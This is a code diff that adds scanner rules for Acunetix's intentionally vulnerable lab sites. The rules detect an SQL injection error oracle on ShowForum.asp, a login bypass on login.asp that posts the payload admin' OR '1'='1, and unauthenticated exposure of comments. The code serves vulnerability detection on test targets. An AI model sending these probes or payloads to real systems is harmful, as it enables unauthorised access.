@@ -13285,6 +13285,156 @@ const clientSideInvictiPracticeSiteEvidence: Rule = async (ctx) => {
   };
 };
 
+// --- Acunetix testasp.vulnweb.com Acuforum ASP lab ---------------------------------
+function isTestaspHost(ctx: RuleContext): boolean {
+  return /testasp\.vulnweb\.com/i.test(ctx.origin);
+}
+
+const testaspShowForumSqliLiveOracle: Rule = async (ctx) => {
+  if (!isTestaspHost(ctx)) return NEGATIVE;
+  const baselineUrl = new URL("/ShowForum.asp?id=0", ctx.origin).toString();
+  const sqliUrl = new URL("/ShowForum.asp?id=0'", ctx.origin).toString();
+  const baselineDoc = await ctx.probe.get(baselineUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  const sqliDoc = await ctx.probe.get(sqliUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (baselineDoc.status < 200 || baselineDoc.status >= 400) return NEGATIVE;
+  if (sqliDoc.status < 500 || sqliDoc.status >= 600) return NEGATIVE;
+  if (!/acuforum|ShowForum/i.test(baselineDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      baselineUrl,
+      sqliUrl,
+      baselineStatus: baselineDoc.status,
+      sqliStatus: sqliDoc.status,
+      note: "Acunetix testasp GET /ShowForum.asp?id=0' returns HTTP 500 vs id=0 baseline 200 — classic ASP SQL injection error oracle"
+    }
+  };
+};
+
+const testaspShowForumSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTestaspHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/ShowForum\.asp\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await testaspShowForumSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Acunetix testasp /ShowForum.asp route scan — id query param triggers HTTP 500 on quote injection vs clean baseline — SQL injection oracle"
+    }
+  };
+};
+
+const TESTASP_SQLI_LOGIN_PAYLOAD = "admin' OR '1'='1";
+
+const testaspLoginSqliLiveOracle: Rule = async (ctx) => {
+  if (!isTestaspHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/login.asp", ctx.origin).toString();
+  const badBody = new URLSearchParams({
+    tfUName: "thugir-invalid-probe",
+    tfUPass: "invalid"
+  }).toString();
+  const badDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: badBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (badDoc.status !== 200 || !/Invalid login/i.test(badDoc.body)) return NEGATIVE;
+  const sqliBody = new URLSearchParams({
+    tfUName: TESTASP_SQLI_LOGIN_PAYLOAD,
+    tfUPass: "x"
+  }).toString();
+  const sqliDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: sqliBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 512,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const sqliLoc = sqliDoc.headers.location || "";
+  if (sqliDoc.status < 300 || sqliDoc.status >= 400) return NEGATIVE;
+  if (!/Default\.asp/i.test(sqliLoc)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: loginUrl,
+      payload: TESTASP_SQLI_LOGIN_PAYLOAD,
+      redirect: sqliLoc.slice(0, 120),
+      note: "Acunetix testasp POST /login.asp with admin' OR '1'='1 redirects to Default.asp vs Invalid login on bad credentials — SQL injection authentication bypass oracle"
+    }
+  };
+};
+
+const testaspLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTestaspHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\.asp\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await testaspLoginSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Acunetix testasp /login.asp route scan — POST SQLi payload redirects to Default.asp — authentication bypass oracle"
+    }
+  };
+};
+
+// --- Acunetix testaspnet.vulnweb.com Acublog ASP.NET lab ---------------------------
+function isTestaspnetHost(ctx: RuleContext): boolean {
+  return /testaspnet\.vulnweb\.com/i.test(ctx.origin);
+}
+
+const testaspnetCommentsExposureLiveOracle: Rule = async (ctx) => {
+  if (!isTestaspnetHost(ctx)) return NEGATIVE;
+  const commentsUrl = new URL("/Comments.aspx?id=1", ctx.origin).toString();
+  const doc = await ctx.probe.get(commentsUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasCommentsTable =
+    /id=["']tblComments["']/i.test(doc.body) &&
+    /class=["']CommentAuthor["']/i.test(doc.body) &&
+    /class=["']CommentText["']/i.test(doc.body);
+  if (!hasCommentsTable) return NEGATIVE;
+  const authorMatch = doc.body.match(/class=["']CommentAuthor["'][^>]*>[\s\S]{0,120}/i);
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: commentsUrl,
+      snippet: authorMatch?.[0]?.slice(0, 160),
+      note: "Acunetix testaspnet GET /Comments.aspx?id=1 returns user comments with poster IP and text without authentication — public comment disclosure oracle"
+    }
+  };
+};
+
+const testaspnetCommentsExposureRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTestaspnetHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/Comments\.aspx\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await testaspnetCommentsExposureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Acunetix testaspnet /Comments.aspx route scan — article comments with poster metadata exposed without login — information disclosure oracle"
+    }
+  };
+};
+
 // --- Gin & Juice Shop scanner evaluation lab (ginandjuice.shop) ----------------
 const CLIENT_GIN_AND_JUICE_SCANNER_LAB_RES: { label: string; re: RegExp }[] = [
   {
@@ -62896,6 +63046,12 @@ export const RULES: Record<string, Rule> = {
   domgoSourcesCatalogDomXssEvidence,
   clientSideBenstaffordXssDemoEvidence,
   clientSideInvictiPracticeSiteEvidence,
+  testaspShowForumSqliLiveOracle,
+  testaspShowForumSqliRouteLiveOracle,
+  testaspLoginSqliLiveOracle,
+  testaspLoginSqliRouteLiveOracle,
+  testaspnetCommentsExposureLiveOracle,
+  testaspnetCommentsExposureRouteLiveOracle,
   clientSideGinAndJuiceScannerLabEvidence,
   clientSideWebsecChallengeEvidence,
   clientSideWebsecCryptoChallengeEvidence,
